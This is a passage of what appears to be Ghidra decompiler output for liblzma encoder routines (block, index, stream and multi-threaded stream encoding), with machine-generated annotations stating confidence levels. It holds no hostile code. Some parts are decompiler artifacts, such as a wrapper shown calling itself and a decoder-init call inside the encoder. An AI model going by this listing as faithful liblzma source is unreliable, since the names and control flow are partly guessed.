          goto LAB_0010a6b3;
        }
      }
      *(ulong *)(param_1 + 4) = (*param_6 - uVar9) - (ulong)param_1[1];
      iVar5 = lzma_block_header_encode(param_1,param_5 + uVar9);
      if (iVar5 != 0) {
        uVar6 = 0xb;
        *param_6 = uVar9;
        goto LAB_0010a4b0;
      }
    }
    for (uVar6 = *(ulong *)(param_1 + 4); (uVar6 & 3) != 0; uVar6 = uVar6 + 1) {
      uVar9 = *param_6;
      *param_6 = uVar9 + 1;
      *(undefined1 *)(param_5 + uVar9) = 0;
    }
    if (__n_00 == 0) {
      uVar6 = 0;
    }
    else {
      lzma_check_init(&local_a8,param_1[2]);
      update_checksum(&local_a8,param_1[2],param_3,param_4);
      lzma_check_finish(&local_a8,param_1[2]);
      memcpy(param_1 + 10,&local_a8,__n_00);
      memcpy((void *)(*param_6 + param_5),&local_a8,__n_00);
      *param_6 = *param_6 + __n_00;
      uVar6 = 0;
    }
  }
LAB_0010a4b0:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar6;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_block_buffer_encode
 * @brief Tail-call wrapper for the actual lzma_block_buffer_encode implementation
 * @confidence 75%
 * @classification io
 * @address 0x0010a790
 */

/* Tail-call wrapper for lzma_block_buffer_encode */

void lzma_block_buffer_encode(void)

{
  lzma_block_buffer_encode();
  return;
}



/**
 * @name  lzma_block_uncomp_encode
 * @brief Wrapper for uncompressed block encoding via lzma_block_buffer_encode with null allocator
 * @confidence 80%
 * @classification io
 * @address 0x0010a7b0
 */

/* Wrapper calling lzma_block_buffer_encode with zero-init params */

void lzma_block_uncomp_encode
               (undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
               undefined8 param_5,undefined8 param_6)

{
  lzma_block_buffer_encode(param_1,0,param_2,param_3,param_4,param_5,param_6,0);
  return;
}



/**
 * @name  lzma_easy_buffer_encode
 * @brief Single-call easy buffer encoding: builds preset filters, delegates to lzma_stream_buffer_encode.
 * @confidence 92%
 * @classification io
 * @address 0x0010aed0
 */

/* Single-call easy buffer encoding with preset */

undefined8
lzma_easy_buffer_encode
          (undefined4 param_1,undefined4 param_2,undefined8 param_3,undefined8 param_4,
          undefined8 param_5,undefined8 param_6,undefined8 param_7,undefined8 param_8)

{
  char cVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  undefined1 local_108 [200];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  cVar1 = lzma_easy_preset(local_108,param_1);
  uVar2 = 8;
  if (cVar1 == '\0') {
    uVar2 = lzma_stream_buffer_encode
                      (local_108,param_2,param_3,param_4,param_5,param_6,param_7,param_8);
  }
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_raw_buffer_encode
 * @brief Single-call raw LZMA encoding from input to output buffer with filter chain initialization and cleanup.
 * @confidence 90%
 * @classification io
 * @address 0x0010b070
 */

/* Encodes raw LZMA data from input buffer to output buffer with initialization and cleanup */

int lzma_raw_buffer_encode
              (undefined8 param_1,undefined8 param_2,long param_3,long param_4,long param_5,
              ulong *param_6,ulong param_7)

{
  ulong uVar1;
  int iVar2;
  int iVar3;
  long in_FS_OFFSET;
  undefined8 local_a0;
  undefined1 local_98 [16];
  undefined1 local_88 [16];
  undefined1 local_78 [16];
  undefined1 local_68 [16];
  undefined1 local_58 [16];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((param_3 != 0) || (iVar2 = 0xb, param_4 == 0)) {
    iVar2 = 0xb;
    if ((param_5 != 0) && ((param_6 != (ulong *)0x0 && (*param_6 <= param_7)))) {
      local_88 = (undefined1  [16])0x0;
      local_98 = ZEXT816(0xffffffffffffffff) << 0x40;
      local_78 = (undefined1  [16])0x0;
      local_68 = (undefined1  [16])0x0;
      local_58 = (undefined1  [16])0x0;
      iVar2 = lzma_next_filter_init(local_98,param_2,param_1);
      if (iVar2 == 0) {
        uVar1 = *param_6;
        local_a0 = 0;
        iVar3 = (*(code *)local_88._8_8_)
                          (local_98._0_8_,param_2,param_3,&local_a0,param_4,param_5,param_6,param_7,
                           3);
        lzma_next_coder_end(local_98,param_2);
        if (iVar3 != 1) {
          iVar2 = 10;
          if (iVar3 != 0) {
            iVar2 = iVar3;
          }
          *param_6 = uVar1;
        }
      }
    }
  }
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_index_encoder_encode
 * @brief State machine encoding LZMA index to output buffer. States: 0=index indicator, 1=block count VLI, 2=unpadded size VLI, 3=uncompressed size VLI, 4=iterate records, 5=padding, 6=CRC32 checksum.
 * @confidence 90%
 * @classification io
 * @address 0x0010b760
 */

/* State machine that encodes an LZMA index to an output buffer. States: 0=write index indicator
   byte (0x00), 1=encode block count VLI, 2=encode unpadded size VLI, 3=encode uncompressed size
   VLI, 4=iterate to next block record, 5=write padding zeros, 6=write CRC32 checksum bytes.
   Maintains a running CRC32 over the encoded data. */

int lzma_index_encoder_encode(int *param_1)

{
  char cVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  ulong uVar5;
  undefined8 uVar6;
  ulong uVar7;
  long lVar8;
  long in_R9;
  ulong *in_stack_00000008;
  ulong in_stack_00000010;
  
  uVar5 = *in_stack_00000008;
  uVar7 = uVar5;
  if (in_stack_00000010 <= uVar5) {
    return 0;
  }
  do {
    switch(*param_1) {
    case 0:
      *(undefined1 *)(in_R9 + uVar7) = 0;
      uVar7 = uVar7 + 1;
      *in_stack_00000008 = uVar7;
      *param_1 = 1;
      break;
    case 1:
      uVar6 = lzma_index_block_count(*(undefined8 *)(param_1 + 2));
      iVar3 = lzma_vli_encode(uVar6,param_1 + 0x50,in_R9,in_stack_00000008,in_stack_00000010);
      if (iVar3 != 1) {
code_r0x0010b9a5:
        lVar8 = *in_stack_00000008 - uVar5;
        if (lVar8 == 0) {
          return iVar3;
        }
        goto LAB_0010b7fe;
      }
      param_1[0x50] = 0;
      param_1[0x51] = 0;
      uVar7 = *in_stack_00000008;
      *param_1 = 4;
      break;
    case 2:
    case 3:
      uVar6 = *(undefined8 *)(param_1 + 0x2e);
      if (*param_1 == 2) {
        uVar6 = *(undefined8 *)(param_1 + 0x30);
      }
LAB_0010b7c0:
      iVar3 = lzma_vli_encode(uVar6,param_1 + 0x50,in_R9,in_stack_00000008,in_stack_00000010);
      if (iVar3 != 1) goto code_r0x0010b9a5;
      *param_1 = *param_1 + 1;
      uVar7 = *in_stack_00000008;
      param_1[0x50] = 0;
      param_1[0x51] = 0;
      break;
    case 4:
      cVar1 = lzma_index_iter_next(param_1 + 4,2);
      if (cVar1 == '\0') {
        *param_1 = 2;
        uVar6 = *(undefined8 *)(param_1 + 0x30);
        goto LAB_0010b7c0;
      }
      uVar4 = lzma_index_padding_size(*(undefined8 *)(param_1 + 2));
      *param_1 = 5;
      uVar7 = *in_stack_00000008;
      *(ulong *)(param_1 + 0x50) = (ulong)uVar4;
      break;
    case 5:
      lVar8 = *(long *)(param_1 + 0x50);
      if (lVar8 == 0) {
        iVar3 = lzma_crc32(in_R9 + uVar5,uVar7 - uVar5,param_1[0x52]);
        *param_1 = 6;
        param_1[0x52] = iVar3;
        goto switchD_0010b7ad_caseD_6;
      }
      *(undefined1 *)(in_R9 + uVar7) = 0;
      *(long *)(param_1 + 0x50) = lVar8 - 1;
      uVar7 = uVar7 + 1;
      *in_stack_00000008 = uVar7;
      break;
    case 6:
switchD_0010b7ad_caseD_6:
      uVar7 = *in_stack_00000008;
      do {
        if (in_stack_00000010 == uVar7) {
          return 0;
        }
        uVar5 = *(long *)(param_1 + 0x50) + 1;
        *(char *)(in_R9 + uVar7) =
             (char)((uint)param_1[0x52] >> ((char)*(long *)(param_1 + 0x50) * '\b' & 0x1fU));
        uVar7 = uVar7 + 1;
        *in_stack_00000008 = uVar7;
        *(ulong *)(param_1 + 0x50) = uVar5;
      } while (uVar5 < 4);
      return 1;
    default:
      return 0xb;
    }
  } while (uVar7 < in_stack_00000010);
  lVar8 = uVar7 - uVar5;
  iVar3 = 0;
LAB_0010b7fe:
  iVar2 = lzma_crc32(in_R9 + uVar5,lVar8,param_1[0x52]);
  param_1[0x52] = iVar2;
  return iVar3;
}



/**
 * @name  lzma_index_buffer_encode
 * @brief Single-call index encoding: validates params, checks buffer space, initializes iterator, encodes via helper.
 * @confidence 90%
 * @classification io
 * @address 0x0010bb10
 */

/* Encodes an LZMA index structure into a provided buffer. Validates parameters, checks buffer
   space, initializes index iterator, and performs encoding via helper function. */

undefined8 lzma_index_buffer_encode(long param_1,long param_2,ulong *param_3,ulong param_4)

{
  ulong uVar1;
  int iVar2;
  undefined8 uVar3;
  ulong uVar4;
  long in_FS_OFFSET;
  undefined4 local_188 [2];
  long local_180;
  undefined1 local_178 [304];
  undefined8 local_48;
  undefined4 local_40;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if ((param_2 == 0 || param_3 == (ulong *)0x0) || (param_1 == 0)) {
    uVar3 = 0xb;
  }
  else {
    uVar1 = *param_3;
    uVar3 = 0xb;
    if (uVar1 <= param_4) {
      uVar4 = lzma_index_size();
      uVar3 = 10;
      if (uVar4 <= param_4 - uVar1) {
        lzma_index_iter_init(local_178,param_1);
        local_188[0] = 0;
        local_40 = 0;
        uVar1 = *param_3;
        local_48 = 0;
        local_180 = param_1;
        iVar2 = lzma_index_encoder_encode(local_188,0,0,0,0,param_2,param_3,param_4,0);
        uVar3 = 0;
        if (iVar2 != 1) {
          *param_3 = uVar1;
          uVar3 = 0xb;
        }
      }
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_stream_buffer_encode
 * @brief Encodes a complete LZMA stream into a buffer: writes stream header, block-encodes data, creates index, writes stream footer. Validates parameters and check type support.
 * @confidence 95%
 * @classification io
 * @address 0x0010bc70
 */

/* LZMA stream buffer encoding function that creates a complete LZMA stream with header, compressed
   data, index, and footer */

int lzma_stream_buffer_encode
              (long param_1,uint param_2,undefined8 param_3,long param_4,long param_5,long param_6,
              ulong *param_7,ulong param_8)

{
  ulong uVar1;
  char cVar2;
  int iVar3;
  undefined8 uVar4;
  long lVar5;
  undefined8 *puVar6;
  long in_FS_OFFSET;
  byte bVar7;
  ulong local_160;
  undefined1 local_158 [16];
  uint local_148;
  undefined1 auStack_144 [12];
  undefined1 local_138 [16];
  undefined8 local_128;
  undefined8 local_118;
  uint local_110;
  undefined8 local_100;
  long local_f8;
  long local_40;
  
  bVar7 = 0;
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((((param_1 != 0) && (param_2 < 0x10)) && ((param_4 != 0 || (param_5 == 0)))) &&
     (((param_6 != 0 && (param_7 != (ulong *)0x0)) && (uVar1 = *param_7, uVar1 <= param_8)))) {
    cVar2 = lzma_check_is_supported(param_2);
    iVar3 = 3;
    if (cVar2 == '\0') goto LAB_0010bec6;
    iVar3 = 10;
    local_160 = uVar1;
    if (param_8 - uVar1 < 0x19) goto LAB_0010bec6;
    auStack_144 = SUB1612((undefined1  [16])0x0,4);
    local_148 = param_2;
    local_128 = 0;
    local_158 = (undefined1  [16])0x0;
    local_138 = (undefined1  [16])0x0;
    iVar3 = lzma_stream_header_encode(local_158,param_6 + uVar1);
    if (iVar3 == 0) {
      local_160 = local_160 + 0xc;
      puVar6 = &local_118;
      for (lVar5 = 0x1a; lVar5 != 0; lVar5 = lVar5 - 1) {
        *puVar6 = 0;
        puVar6 = puVar6 + (ulong)bVar7 * -2 + 1;
      }
      local_110 = param_2;
      local_f8 = param_1;
      if (param_5 == 0) {
        lVar5 = lzma_index_init(param_3);
        if (lVar5 == 0) {
LAB_0010bf00:
          iVar3 = 5;
          goto LAB_0010bec6;
        }
      }
      else {
        iVar3 = lzma_block_buffer_encode
                          (&local_118,param_3,param_4,param_5,param_6,&local_160,param_8 - 0xc);
        if (iVar3 != 0) goto LAB_0010bec6;
        lVar5 = lzma_index_init(param_3);
        if (lVar5 == 0) goto LAB_0010bf00;
        uVar4 = lzma_block_unpadded_size(&local_118);
        iVar3 = lzma_index_append(lVar5,param_3,uVar4,local_100);
        if (iVar3 != 0) {
          lzma_index_end(lVar5,param_3);
          goto LAB_0010bec6;
        }
      }
      iVar3 = lzma_index_buffer_encode(lVar5,param_6,&local_160,param_8 - 0xc);
      uVar4 = lzma_index_size(lVar5);
      local_158._8_8_ = uVar4;
      lzma_index_end(lVar5,param_3);
      if (iVar3 != 0) goto LAB_0010bec6;
      iVar3 = lzma_stream_footer_encode(local_158,local_160 + param_6);
      if (iVar3 == 0) {
        *param_7 = local_160 + 0xc;
        iVar3 = 0;
        goto LAB_0010bec6;
      }
    }
  }
  iVar3 = 0xb;
LAB_0010bec6:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_stream_encode
 * @brief LZMA stream encoder state machine. States: 0=stream header, 1=start block/finish, 2=block header, 3=encode block, 4=encode index, 5=stream footer. Handles block headers, compression, index appending, footer.
 * @confidence 90%
 * @classification io
 * @address 0x0010bf70
 */

/* LZMA stream encoder state machine with states: 0=write stream header, 1=start new block or
   finish, 2=write block header, 3=encode block data, 4=encode index, 5=write stream footer. Handles
   block header encoding, block compression dispatch, index appending, and footer generation. */

ulong lzma_stream_encode(int *param_1,undefined8 param_2,undefined8 param_3,long *param_4,
                        long param_5,undefined8 param_6,ulong *param_7,ulong param_8,uint param_9)

{
  int *piVar1;
  int *piVar2;
  int iVar3;
  ulong uVar4;
  undefined8 uVar5;
  long in_FS_OFFSET;
  undefined1 local_78 [16];
  undefined1 local_68 [16];
  undefined1 local_58 [16];
  undefined8 local_48;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (*param_7 < param_8) {
    piVar2 = param_1 + 0x78;
    do {
      switch(*param_1) {
      case 0:
      case 2:
      case 5:
        lzma_bufcpy(piVar2,param_1 + 0x74,*(undefined8 *)(param_1 + 0x76),param_6,param_7,param_8);
        if (*(ulong *)(param_1 + 0x74) < *(ulong *)(param_1 + 0x76)) goto LAB_0010c053;
        if (*param_1 == 5) {
          uVar4 = 1;
          goto LAB_0010c055;
        }
        param_1[0x74] = 0;
        param_1[0x75] = 0;
        *param_1 = *param_1 + 1;
        break;
      case 1:
        if (*param_4 == param_5) {
          if (param_9 != 3) {
            uVar4 = (ulong)(param_9 != 0);
            goto LAB_0010c055;
          }
          uVar4 = lzma_index_encoder_init_coder
                            (param_1 + 0x5e,param_2,*(undefined8 *)(param_1 + 0x72));
          if ((int)uVar4 != 0) goto LAB_0010c055;
          *param_1 = 4;
        }
        else {
          piVar1 = param_1 + 0x16;
          if ((char)param_1[1] == '\0') {
            param_1[0x1a] = -1;
            param_1[0x1b] = -1;
            param_1[0x1c] = -1;
            param_1[0x1d] = -1;
            uVar4 = lzma_block_header_size(piVar1);
            if (((int)uVar4 != 0) ||
               (uVar4 = lzma_alone_decoder_init(param_1 + 2,param_2,piVar1), (int)uVar4 != 0))
            goto LAB_0010c055;
          }
          *(undefined1 *)(param_1 + 1) = 0;
          iVar3 = lzma_block_header_encode(piVar1,piVar2);
          if (iVar3 != 0) goto LAB_0010c274;
          *param_1 = 2;
          *(ulong *)(param_1 + 0x76) = (ulong)(uint)param_1[0x17];
        }
        break;
      case 3:
        uVar4 = (**(code **)(param_1 + 8))
                          (*(undefined8 *)(param_1 + 2),param_2,param_3,param_4,param_5,param_6,
                           param_7,param_8,*(undefined4 *)(&DAT_00124940 + (ulong)param_9 * 4));
        if (((int)uVar4 != 1) || (param_9 == 1)) goto LAB_0010c055;
        uVar5 = lzma_block_unpadded_size(param_1 + 0x16);
        uVar4 = lzma_index_append(*(undefined8 *)(param_1 + 0x72),param_2,uVar5);
        if ((int)uVar4 != 0) goto LAB_0010c055;
        *param_1 = 1;
        break;
      case 4:
        uVar4 = (**(code **)(param_1 + 100))
                          (*(undefined8 *)(param_1 + 0x5e),param_2,0,0,0,param_6,param_7,param_8,0);
        if ((int)uVar4 != 1) goto LAB_0010c055;
        local_48 = 0;
        local_78 = (undefined1  [16])0x0;
        local_68 = (undefined1  [16])0x0;
        local_58 = (undefined1  [16])0x0;
        uVar5 = lzma_index_size(*(undefined8 *)(param_1 + 0x72));
        local_78._8_8_ = uVar5;
        local_68._0_4_ = param_1[0x18];
        iVar3 = lzma_stream_footer_encode(local_78,piVar2);
        if (iVar3 != 0) {
LAB_0010c274:
          uVar4 = 0xb;
          goto LAB_0010c055;
        }
        param_1[0x76] = 0xc;
        param_1[0x77] = 0;
        *param_1 = 5;
        break;
      default:
        uVar4 = 0xb;
        goto LAB_0010c055;
      }
    } while (*param_7 < param_8);
  }
LAB_0010c053:
  uVar4 = 0;
LAB_0010c055:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar4;
}



/**
 * @name  lzma_stream_encoder_mt_encode
 * @brief Multi-threaded LZMA stream encoder state machine. States: 0=stream header, 1=encode blocks with workers, 2=write index, 3=write footer. Manages worker creation, mutex/condvar coordination, block distribution.
 * @confidence 88%
 * @classification io
 * @address 0x0010d750
 */

/* Multi-threaded LZMA stream encoder state machine. States: 0=write stream header, 1=encoding
   blocks with worker threads, 2=write index, 3=write stream footer. Manages worker thread creation,
   mutex/condvar coordination, block distribution, and index management. */

uint lzma_stream_encoder_mt_encode
               (uint *param_1,undefined8 param_2,undefined8 param_3,ulong *param_4,ulong param_5,
               undefined8 param_6,ulong *param_7,ulong param_8,int param_9)

{
  uint *puVar1;
  pthread_mutex_t *__mutex;
  bool bVar2;
  char cVar3;
  uint uVar4;
  int iVar5;
  undefined4 *puVar6;
  long lVar7;
  undefined8 uVar8;
  int *piVar9;
  pthread_cond_t *__cond;
  ulong uVar10;
  pthread_mutex_t *__mutex_00;
  long in_FS_OFFSET;
  bool bVar11;
  undefined8 local_178;
  undefined8 local_170;
  timespec local_168;
  timespec local_158;
  __sigset_t local_148;
  pthread_condattr_t local_c8 [34];
  long local_40;
  
  uVar4 = *param_1;
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (uVar4 == 2) {
LAB_0010e070:
    uVar4 = (**(code **)(param_1 + 0x34))
                      (*(undefined8 *)(param_1 + 0x2e),param_2,0,0,0,param_6,param_7,param_8,0);
    if (uVar4 != 1) goto LAB_0010dc80;
    uVar4 = 0xb;
    uVar8 = lzma_index_size(*(undefined8 *)(param_1 + 0x2c));
    *(undefined8 *)(param_1 + 0x44) = uVar8;
    iVar5 = lzma_stream_footer_encode(param_1 + 0x42,param_1 + 0x50);
    if (iVar5 != 0) goto LAB_0010dc80;
    *param_1 = 3;
  }
  else {
    if (uVar4 < 3) {
      if (uVar4 == 0) {
        lzma_bufcpy(param_1 + 0x50,param_1 + 0x54,0xc,param_6,param_7,param_8);
        uVar4 = 0;
        if (*(ulong *)(param_1 + 0x54) < 0xc) goto LAB_0010dc80;
        param_1[0x54] = 0;
        param_1[0x55] = 0;
        *param_1 = 1;
      }
      puVar1 = param_1 + 0x56;
      bVar2 = false;
      __mutex = (pthread_mutex_t *)(param_1 + 0x76);
      local_178 = 0;
      local_170 = 0;
      local_168.tv_sec = 0;
      local_168.tv_nsec = 0;
LAB_0010d7f0:
      pthread_mutex_lock(__mutex);
      uVar4 = param_1[0x69];
      if (uVar4 == 0) {
        uVar4 = FUN_00109d70(puVar1,param_2,param_6,param_7,param_8,&local_178,&local_170);
        pthread_mutex_unlock(__mutex);
        if (uVar4 == 1) {
LAB_0010d81a:
          uVar4 = lzma_index_append(*(undefined8 *)(param_1 + 0x2c),param_2,local_178,local_170);
          if (uVar4 == 0) {
            if (param_8 <= *param_7) {
LAB_0010d858:
              lVar7 = *(long *)(param_1 + 0x70);
              do {
                uVar10 = *param_4;
                if (uVar10 < param_5) {
                  if (lVar7 == 0) goto LAB_0010d946;
                }
                else if ((lVar7 == 0) || (param_9 == 0)) goto LAB_0010dba0;
LAB_0010d880:
                local_158.tv_sec = *(long *)(lVar7 + 0x10);
                lzma_bufcpy(param_3,param_4,param_5,*(undefined8 *)(lVar7 + 8),&local_158,
                            *(undefined8 *)(param_1 + 2));
                if (*(long *)(param_1 + 2) == local_158.tv_sec) {
                  pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x70) + 0x1b8));
                  piVar9 = *(int **)(param_1 + 0x70);
                  if (*piVar9 != 0) {
                    __cond = (pthread_cond_t *)(piVar9 + 0x78);
                    *(__time_t *)(piVar9 + 4) = local_158.tv_sec;
                    goto LAB_0010d90d;
                  }
LAB_0010db68:
                  pthread_mutex_unlock((pthread_mutex_t *)(piVar9 + 0x6e));
                  pthread_mutex_lock(__mutex);
                  uVar4 = param_1[0x69];
                  pthread_mutex_unlock(__mutex);
                  if (uVar4 == 0) goto LAB_0010db94;
                  goto LAB_0010dda8;
                }
                uVar10 = *param_4;
                pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x70) + 0x1b8));
                piVar9 = *(int **)(param_1 + 0x70);
                if (*piVar9 == 0) goto LAB_0010db68;
                __cond = (pthread_cond_t *)(piVar9 + 0x78);
                *(__time_t *)(piVar9 + 4) = local_158.tv_sec;
                if (uVar10 == param_5 && param_9 != 0) {
LAB_0010d90d:
                  *piVar9 = 2;
                  pthread_cond_signal(__cond);
                  pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0x70) + 0x1b8));
                  uVar10 = *param_4;
                  param_1[0x70] = 0;
                  param_1[0x71] = 0;
                  if (param_5 <= uVar10) goto LAB_0010dba0;
LAB_0010d946:
                  if (param_1[100] <= param_1[0x62]) goto LAB_0010db94;
                  uVar4 = lzma_outq_alloc_buffer(puVar1,param_2,*(undefined8 *)(param_1 + 0x66));
                  if ((uVar4 == 0) &&
                     ((*(long *)(param_1 + 0x18) != -1 ||
                      (uVar4 = lzma_filters_copy(param_1 + 4,param_1 + 0x18,param_2), uVar4 == 0))))
                  {
                    pthread_mutex_lock(__mutex);
                    lVar7 = *(long *)(param_1 + 0x6e);
                    if (lVar7 != 0) {
                      *(long *)(param_1 + 0x70) = lVar7;
                      *(undefined8 *)(param_1 + 0x6e) = *(undefined8 *)(lVar7 + 0x1b0);
                    }
                    pthread_mutex_unlock(__mutex);
                    if (*(long *)(param_1 + 0x70) == 0) {
                      if (param_1[0x6d] == param_1[0x6c]) goto LAB_0010db94;
                      puVar6 = (undefined4 *)
                               ((ulong)param_1[0x6d] * 0x220 + *(long *)(param_1 + 0x6a));
                      lVar7 = lzma_alloc(*(undefined8 *)(param_1 + 2));
                      *(long *)(puVar6 + 2) = lVar7;
                      if (lVar7 == 0) {
                        uVar4 = 5;
                        goto LAB_0010de70;
                      }
                      __mutex_00 = (pthread_mutex_t *)(puVar6 + 0x6e);
                      iVar5 = pthread_mutex_init(__mutex_00,(pthread_mutexattr_t *)0x0);
                      if (iVar5 == 0) {
                        iVar5 = clock_gettime(1,&local_158);
                        if (iVar5 == 0) {
                          iVar5 = pthread_condattr_init(local_c8);
                          if (iVar5 != 0) goto LAB_0010da66;
                          iVar5 = pthread_condattr_setclock(local_c8,1);
                          if (iVar5 != 0) {
                            pthread_condattr_destroy(local_c8);
                            goto LAB_0010da66;
                          }
                          iVar5 = pthread_cond_init((pthread_cond_t *)(puVar6 + 0x78),local_c8);
                          pthread_condattr_destroy(local_c8);
                          if (iVar5 != 0) goto LAB_0010da66;
                          puVar6[0x84] = 1;
LAB_0010da8f:
                          *(uint **)(puVar6 + 8) = param_1;
                          *(undefined1 (*) [16])(puVar6 + 0x10) = (undefined1  [16])0x0;
                          *puVar6 = 0;
                          *(undefined8 *)(puVar6 + 10) = param_2;
                          *(undefined8 *)(puVar6 + 0xc) = 0;
                          *(undefined8 *)(puVar6 + 0xe) = 0;
                          *(undefined8 *)(puVar6 + 0x12) = 0xffffffffffffffff;
                          *(undefined8 *)(puVar6 + 0x58) = 0xffffffffffffffff;
                          *(undefined1 (*) [16])(puVar6 + 0x14) = (undefined1  [16])0x0;
                          *(undefined1 (*) [16])(puVar6 + 0x18) = (undefined1  [16])0x0;
                          *(undefined1 (*) [16])(puVar6 + 0x1c) = (undefined1  [16])0x0;
                          *(undefined1 (*) [16])(puVar6 + 0x20) = (undefined1  [16])0x0;
                          sigfillset((sigset_t *)local_c8);
                          pthread_sigmask(2,(__sigset_t *)local_c8,&local_148);
                          iVar5 = pthread_create((pthread_t *)(puVar6 + 0x86),(pthread_attr_t *)0x0,
                                                 lzma_worker_thread,puVar6);
                          pthread_sigmask(2,&local_148,(__sigset_t *)0x0);
                          if (iVar5 == 0) {
                            param_1[0x6d] = param_1[0x6d] + 1;
                            *(undefined4 **)(param_1 + 0x70) = puVar6;
                            goto LAB_0010df3f;
                          }
                          pthread_cond_destroy((pthread_cond_t *)(puVar6 + 0x78));
                        }
                        else {
LAB_0010da66:
                          puVar6[0x84] = 0;
                          iVar5 = pthread_cond_init((pthread_cond_t *)(puVar6 + 0x78),
                                                    (pthread_condattr_t *)0x0);
                          if (iVar5 == 0) goto LAB_0010da8f;
                        }
                        pthread_mutex_destroy(__mutex_00);
                      }
                      uVar4 = 5;
                      lzma_free(*(undefined8 *)(puVar6 + 2),param_2);
                      lVar7 = *(long *)(param_1 + 0x70);
                      goto joined_r0x0010e17d;
                    }
                    __mutex_00 = (pthread_mutex_t *)(*(long *)(param_1 + 0x70) + 0x1b8);
LAB_0010df3f:
                    pthread_mutex_lock(__mutex_00);
                    puVar6 = *(undefined4 **)(param_1 + 0x70);
                    *puVar6 = 1;
                    *(undefined8 *)(puVar6 + 4) = 0;
                    uVar8 = lzma_outq_enqueue(puVar1,0);
                    *(undefined8 *)(puVar6 + 6) = uVar8;
                    lzma_filters_free(*(long *)(param_1 + 0x70) + 0x160);
                    uVar8 = *(undefined8 *)(param_1 + 0x1a);
                    lVar7 = *(long *)(param_1 + 0x70);
                    *(undefined8 *)(lVar7 + 0x160) = *(undefined8 *)(param_1 + 0x18);
                    *(undefined8 *)(lVar7 + 0x168) = uVar8;
                    uVar8 = *(undefined8 *)(param_1 + 0x1e);
                    *(undefined8 *)(lVar7 + 0x170) = *(undefined8 *)(param_1 + 0x1c);
                    *(undefined8 *)(lVar7 + 0x178) = uVar8;
                    uVar8 = *(undefined8 *)(param_1 + 0x22);
                    *(undefined8 *)(lVar7 + 0x180) = *(undefined8 *)(param_1 + 0x20);
                    *(undefined8 *)(lVar7 + 0x188) = uVar8;
                    uVar8 = *(undefined8 *)(param_1 + 0x26);
                    *(undefined8 *)(lVar7 + 400) = *(undefined8 *)(param_1 + 0x24);
                    *(undefined8 *)(lVar7 + 0x198) = uVar8;
                    uVar8 = *(undefined8 *)(param_1 + 0x2a);
                    *(undefined8 *)(lVar7 + 0x1a0) = *(undefined8 *)(param_1 + 0x28);
                    *(undefined8 *)(lVar7 + 0x1a8) = uVar8;
                    param_1[0x18] = 0xffffffff;
                    param_1[0x19] = 0xffffffff;
                    pthread_cond_signal((pthread_cond_t *)(*(long *)(param_1 + 0x70) + 0x1e0));
                    pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0x70) + 0x1b8));
                    lVar7 = *(long *)(param_1 + 0x70);
                    if (lVar7 == 0) {
LAB_0010db94:
                      uVar10 = *param_4;
                      goto LAB_0010dba0;
                    }
                  }
                  else {
LAB_0010de70:
                    lVar7 = *(long *)(param_1 + 0x70);
joined_r0x0010e17d:
                    if (lVar7 == 0) goto LAB_0010dda8;
                  }
                  goto LAB_0010d880;
                }
                pthread_cond_signal(__cond);
                pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0x70) + 0x1b8));
                lVar7 = *(long *)(param_1 + 0x70);
              } while( true );
            }
            goto LAB_0010d7f0;
          }
        }
        else if (uVar4 == 0) goto LAB_0010d858;
      }
      else {
        pthread_mutex_unlock(__mutex);
        if (uVar4 == 1) goto LAB_0010d81a;
      }
LAB_0010dda8:
      signal_and_wait_worker_threads(param_1,0);
      goto LAB_0010dc80;
    }
    if (uVar4 != 3) {
      uVar4 = 0xb;
      goto LAB_0010dc80;
    }
  }
  lzma_bufcpy(param_1 + 0x50,param_1 + 0x54,0xc,param_6,param_7,param_8);
  uVar4 = (uint)(0xb < *(ulong *)(param_1 + 0x54));
LAB_0010dc80:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar4;
LAB_0010dba0:
  if (uVar10 == param_5) {
    if (param_9 == 0) goto LAB_0010e1b8;
    if (param_9 == 4) {
LAB_0010de04:
      uVar4 = 1;
      goto LAB_0010dc80;
    }
    if (param_1[0x62] == 0) {
      if (param_9 == 3) {
        uVar4 = lzma_index_encoder_init_coder
                          (param_1 + 0x2e,param_2,*(undefined8 *)(param_1 + 0x2c));
        if (uVar4 != 0) goto LAB_0010dc80;
        *param_1 = 2;
        lVar7 = lzma_index_size(*(undefined8 *)(param_1 + 0x2c));
        *(long *)(param_1 + 0x74) = *(long *)(param_1 + 0x74) + 0xc + lVar7;
        goto LAB_0010e070;
      }
      if (param_9 == 2) goto LAB_0010de04;
    }
  }
  if (*param_7 != param_8) {
    uVar4 = param_1[0x68];
    if ((uVar4 != 0) && (!bVar2)) {
